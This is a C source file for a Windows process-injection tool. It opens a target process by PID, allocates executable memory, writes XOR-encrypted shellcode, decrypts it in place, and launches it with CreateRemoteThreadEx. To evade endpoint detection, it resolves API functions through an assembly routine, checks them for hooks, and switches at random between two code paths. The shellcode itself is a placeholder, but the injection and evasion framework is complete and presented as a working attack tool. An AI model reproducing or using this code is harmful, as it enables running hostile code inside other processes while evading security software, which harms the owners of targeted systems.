#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <time.h>

#define i(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)
#define e(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
#define s(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define w(msg, ...) printf("[!] " msg "\n", ##__VA_ARGS__)

// Declaration of the external assembly function
extern void* GetFunctionAddress(const char* functionName);

// Check if the function is hooked
BOOL IsFunctionHooked(void* functionAddress);

BOOL IsFunctionHooked(void* functionAddress) {
    MEMORY_BASIC_INFORMATION mbi;
    if (VirtualQuery(functionAddress, &mbi, sizeof(mbi)) == 0) {
        return TRUE;
    }

    if ((mbi.Protect & PAGE_EXECUTE_WRITECOPY) || (mbi.Protect & PAGE_EXECUTE_READWRITE) ||
        (mbi.Protect & PAGE_WRITECOPY) || (mbi.Protect & PAGE_READWRITE)) {
        return TRUE;
    }

    BYTE syscallPattern[] = { 0x4C, 0x8B, 0xD1, 0xB8 };
    if (memcmp(functionAddress, syscallPattern, sizeof(syscallPattern)) != 0) {
        return TRUE;
    }

    return FALSE;
}

int main(int argc, char* argv[]) {
    // Shellcode (example, must be replaced with actual shellcode)
    unsigned char shellcode[] = "\x8a\x2d\..."; // Shellcode here
    int sizeshellcode = sizeof(shellcode);

    i("Size of shellcode is: %d bytes", sizeshellcode);

    if (argc < 2) {
        e("Usage: %s <PID>", argv[0]);
        return 1;
    }

    DWORD PID = atoi(argv[1]);
    i("Inserted PID: %d", PID);

    // Randomly choose between different implementation strategies
    srand((unsigned int)time(NULL));
    int strategy = rand() % 2;

    if (strategy == 0) {
        // Strategy 1: Normal implementation
        void* openProcessAddr = GetFunctionAddress("OpenProcess");
        if (openProcessAddr == NULL || IsFunctionHooked(openProcessAddr)) {
            e("Failed to retrieve a clean OpenProcess function address.");
            return 1;
        }
        HANDLE(WINAPI* OpenProcess)(DWORD, BOOL, DWORD) = (HANDLE(WINAPI*)(DWORD, BOOL, DWORD))openProcessAddr;

        i("Trying to get the handle of the process: %d", PID);
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
        if (hProcess == NULL) {
            e("Not able to get the handle of process %d", PID);
            return 1;
        }
        s("Got the handle of the process: %d", PID);
        i("Process handle: 0x%p", hProcess);

        void* virtualAllocExAddr = GetFunctionAddress("VirtualAllocEx");
        if (virtualAllocExAddr == NULL || IsFunctionHooked(virtualAllocExAddr)) {
            e("Failed to retrieve a clean VirtualAllocEx function address.");
            return 1;
        }
        LPVOID(WINAPI* VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD) = (LPVOID(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))virtualAllocExAddr;

        i("Trying to allocate buffer in the process's virtual memory...");
        LPVOID AllocBuffer = VirtualAllocEx(hProcess, NULL, sizeshellcode, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
        if (AllocBuffer == NULL) {
            e("Failed to allocate buffer.");
            return 1;
        }
        s("Successfully allocated the buffer into the virtual space of the process");
        i("Address: 0x%p", AllocBuffer);

        void* writeProcessMemoryAddr = GetFunctionAddress("WriteProcessMemory");
        if (writeProcessMemoryAddr == NULL || IsFunctionHooked(writeProcessMemoryAddr)) {
            e("Failed to retrieve a clean WriteProcessMemory function address.");
            return 1;
        }
        BOOL(WINAPI* WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*) = (BOOL(WINAPI*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*))writeProcessMemoryAddr;

        if (WriteProcessMemory(hProcess, AllocBuffer, shellcode, sizeshellcode, NULL) == 0) {
            e("Unable to write the shellcode.");
            return 1;
        }
        s("Wrote shellcode to the buffer!");

        // Decrypt the shellcode in memory
        BYTE value;
        char key[] = "veryhardkey";
        for (int i = 0; i < sizeshellcode - 1; i++) {
            ReadProcessMemory(hProcess, (LPVOID)((uintptr_t)AllocBuffer + i), &value, sizeof(value), NULL);
            value = (value ^ key[i % (sizeof(key) - 1)]);
            WriteProcessMemory(hProcess, (LPVOID)((uintptr_t)AllocBuffer + i), &value, sizeof(value), NULL);
        }

        void* createRemoteThreadAddr = GetFunctionAddress("CreateRemoteThreadEx");
        if (createRemoteThreadAddr == NULL || IsFunctionHooked(createRemoteThreadAddr)) {
            e("Failed to retrieve a clean CreateRemoteThreadEx function address.");
            return 1;
        }
        HANDLE(WINAPI* CreateRemoteThreadEx)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPPROC_THREAD_ATTRIBUTE_LIST, LPDWORD) = (HANDLE(WINAPI*)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPPROC_THREAD_ATTRIBUTE_LIST, LPDWORD))createRemoteThreadAddr;

        DWORD TID;
        HANDLE hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)AllocBuffer, NULL, 0, NULL, &TID);
        if (hThread == NULL) {
            e("Failed to create remote thread.");
            return 1;
        }

        i("Thread invoked!");
        i("Thread handle: 0x%p", hThread);
        i("Thread ID: %d", TID);

    } else {
        // Strategy 2: Obfuscated implementation
        void* funcAddr;
        HANDLE(WINAPI* funcPtr)(DWORD, BOOL, DWORD);
        LPVOID(WINAPI* allocFunc)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
        BOOL(WINAPI* writeFunc)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
        HANDLE(WINAPI* threadFunc)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPPROC_THREAD_ATTRIBUTE_LIST, LPDWORD);

        funcAddr = GetFunctionAddress("OpenProcess");
        if (funcAddr == NULL || IsFunctionHooked(funcAddr)) {
            e("Failed to retrieve a clean OpenProcess function address.");
            return 1;
        }
        funcPtr = (HANDLE(WINAPI*)(DWORD, BOOL, DWORD))funcAddr;

        i("Trying to get the handle of the process: %d", PID);
        HANDLE hProcess = funcPtr(PROCESS_ALL_ACCESS, FALSE, PID);
        if (hProcess == NULL) {
            e("Not able to get the handle of process %d", PID);
            return 1;
        }
        s("Got the handle of the process: %d", PID);
        i("Process handle: 0x%p", hProcess);

        funcAddr = GetFunctionAddress("VirtualAllocEx");
        if (funcAddr == NULL || IsFunctionHooked(funcAddr)) {
            e("Failed to retrieve a clean VirtualAllocEx function address.");
            return 1;
        }
        allocFunc = (LPVOID(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))funcAddr;

        i("Trying to allocate buffer in the process's virtual memory...");
        LPVOID AllocBuffer = allocFunc(hProcess, NULL, sizeshellcode, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
        if (AllocBuffer == NULL) {
            e("Failed to allocate buffer.");
            return 1;
        }
        s("Successfully allocated the buffer into the virtual space of the process");
        i("Address: 0x%p", AllocBuffer);

        funcAddr = GetFunctionAddress("WriteProcessMemory");
        if (funcAddr == NULL || IsFunctionHooked(funcAddr)) {
            e("Failed to retrieve a clean WriteProcessMemory function address.");
            return 1;
        }
        writeFunc = (BOOL(WINAPI*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*))funcAddr;

        if (writeFunc(hProcess, AllocBuffer, shellcode, sizeshellcode, NULL) == 0) {
            e("Unable to write the shellcode.");
            return 1;
        }
        s("Wrote shellcode to the buffer!");

        // Decrypt the shellcode in memory
        BYTE value;
        char key[] = "veryhardkey";
        for (int i = 0; i < sizeshellcode - 1; i++) {
            ReadProcessMemory(hProcess, (LPVOID)((uintptr_t)AllocBuffer + i), &value, sizeof(value), NULL);
            value = (value ^ key[i % (sizeof(key) - 1)]);
            writeFunc(hProcess, (LPVOID)((uintptr_t)AllocBuffer + i), &value, sizeof(value), NULL);
        }

        funcAddr = GetFunctionAddress("CreateRemoteThreadEx");
        if (funcAddr == NULL || IsFunctionHooked(funcAddr)) {
            e("Failed to retrieve a clean CreateRemoteThreadEx function address.");
            return 1;
        }
        threadFunc = (HANDLE(WINAPI*)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPPROC_THREAD_ATTRIBUTE_LIST, LPDWORD))funcAddr;

        DWORD TID;
        HANDLE hThread = threadFunc(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)AllocBuffer, NULL, 0, NULL, &TID);
        if (hThread == NULL) {
            e("Failed to create remote thread.");
            return 1;
        }

        i("Thread invoked!");
        i("Thread handle: 0x%p", hThread);
        i("Thread ID: %d", TID);
    }

    return 0;
}
